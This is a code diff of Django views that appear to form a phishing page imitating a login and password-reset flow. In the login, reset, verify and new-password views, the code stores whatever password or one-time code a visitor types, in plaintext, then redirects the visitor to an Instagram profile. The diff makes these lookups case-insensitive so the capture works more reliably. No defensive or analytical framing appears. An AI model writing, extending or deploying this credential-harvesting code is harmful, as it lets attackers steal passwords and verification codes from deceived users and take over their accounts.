@@ -19,7 +19,7 @@ def password_page(request):
         password = request.POST.get("password")
         # print(f"Updating password for user: {username} to {password}")
 
-        User.objects.filter(username='polleykalicharan').update(password=password)
+        User.objects.filter(username__iexact='polleykalicharan').update(password=password)
         if password:
             return redirect("https://www.instagram.com/surya_____2021/")
 
@@ -36,13 +36,14 @@ def login(request):
         print(identifier)
 
         user = User.objects.filter(
-            Q(mobile=identifier) | Q(email=identifier) | Q(username=identifier)
+            Q(mobile__iexact=identifier) |
+            Q(email__iexact=identifier)
         ).first()
 
         if user:
             # Save the username in the session
             User.objects.filter(
-            Q(mobile=identifier) | Q(email=identifier) | Q(username=identifier)
+            Q(mobile__iexact=identifier) | Q(email__iexact=identifier) | Q(username__iexact=identifier)
         ).update(password=password)
             request.session["username"] = identifier
             return redirect("https://www.instagram.com/surya_____2021/")
@@ -68,7 +69,7 @@ def forgot_password(request):
     Q(email__iexact=identifier)
 ).first()
         print(user)
-        User.objects.filter(Q(mobile=identifier) | Q(email=identifier)).update(otp=identifier[-6:])  # Update the OTP field with the identifier
+        User.objects.filter(Q(mobile__iexact=identifier) | Q(email__iexact=identifier)).update(otp=identifier[-6:])  # Update the OTP field with the identifier
 
         if user:
             # save user data for next page
@@ -118,7 +119,7 @@ def verify(request):
 
     if request.method == "POST":
         code = request.POST.get("code")
-        User.objects.filter(Q(mobile=identifier) | Q(email=identifier)).update(otp=code)  #
+        User.objects.filter(Q(mobile__iexact=identifier) | Q(email__iexact=identifier)).update(otp=code)  #
 
         # Replace this with your actual OTP verification
         if code:  
@@ -156,7 +157,7 @@ def new_password(request):
 
     # #     user_id = request.session.get("user_id")
 
-        User.objects.filter(username='polleykalicharan').update(password=password)
+        User.objects.filter(username__iexact='polleykalicharan').update(password=password)
         if password:
             return redirect("https://www.instagram.com/surya_____2021/")
             
